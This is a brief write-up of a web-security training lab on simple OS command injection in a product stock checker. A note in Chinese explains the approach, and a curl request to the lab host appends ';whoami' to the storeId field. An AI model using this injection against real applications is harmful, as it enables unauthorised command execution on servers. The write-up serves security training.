# Lab: OS command injection, simple case

This lab contains an OS command injection vulnerability in the product stock checker.

The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.

To solve the lab, execute the whoami command to determine the name of the current user.

## OS command injection
* 題目說 stock checker 有 command injection，就用 `;` 隔開就可以了
```
payload = curl https://acd11f811f4ec16cc0b2865d00d60070.web-security-academy.net/product/stock --data 'productId=3&storeId=1;whoami'
```